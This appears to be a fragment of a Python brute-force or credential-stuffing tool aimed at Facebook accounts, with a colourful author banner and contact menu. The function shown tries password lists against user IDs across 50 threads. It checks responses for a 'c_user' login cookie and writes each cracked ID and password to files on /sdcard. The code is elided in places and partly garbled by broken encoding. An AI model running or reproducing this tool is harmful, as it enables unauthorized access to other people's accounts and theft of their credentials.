...
\33[92;1m ▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
\33[38;5;46m ▊   ‌‌‌‌‌‌                                              ██
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐀𝐮𝐭𝐡𝐨𝐫    \33[38;5;196m: \3[97;m Montasir Sabit𘠠♚   \33[38;5;46m               ▇▎ 
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐆𝐢𝐭𝐡𝐮𝐛    \33[38;5;196m: \33[1;92m𝐡𝐭𝐭𝐩𝐬://𝐠𝐢𝐭𝐡𝐮𝐛.𝐜𝐨𝐦/Montasir000\33[38;5;46m ▇▎
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐒𝐭𝐚𝐭𝐮𝐬    \33[38;5;196m: \33[1;92mFree \3[97;1m⬤  \33[38;5;46m                         ▇▎           
...
def admin():
	...
	print(logo)
	print(50*'_')
	print(' [1] C𝐨𝐧𝐭𝐫𝐚𝐜𝐭 Telegram')
	print(' [2] 𝐅𝐨𝐥𝐥𝐨𝐰 𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤 ')
	print(' [3] 𝐅𝐨𝐥𝐥𝐨𝐰 𝐆𝐢𝐭𝐡𝐮𝐛 ')
	print(' [0] 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐚𝐢𝐧 𝐦𝐞𝐧𝐮')
	bal = input('𝐂𝐡𝐨𝐨𝐬𝐞 𝐨𝐩𝐭𝐢𝐨𝐧>>> ')
	if bal =='1':
		os.system('xdg-open http://telegram.me/Montasir00');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.co/balibihin.moruvumi');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/Montasir000');time.sleep(1)
		admin()
	if bal =='0':
		Main()
def hoga_check():
  uuid =  str(os.geteuid()) + str(os.getlogin()) 
  id = "MONTASIR-𝐌-x0x0x" + "|".join(uuid)
  os.system("clear")
  print(logo)
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		print('\33[97;1m [🚀]  𝐔ser𝐚𝐠𝐞𝐧𝐭𝐬 : '+str(len(ugen)))
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\ \33[1;90m[\33[1;93mMONTASIR\33[1;90m] \33[1;96m%s/%s\33[1;90m \33[1;90m[\33[1;92mOK:%s\33[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/montasir-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\')
                break
                ...
                print(f'{W}CP-UA--> {pro}\ ')
                open('/sdcard/montasir-CP.txt', 'a').write( uid+' | '+ps+' \')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\\33[m[MONTASIR] \33[1;92m%s\33[m |\33[m[\33[mOK:\33[1;92m%s\33[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \{R} [{B}MONTASIR{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€�{P}[{H}{ok}{P}]Ã¢â‚¬â€�{P}[{k}{cp}{x}]Ã¢â‚¬â€�[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
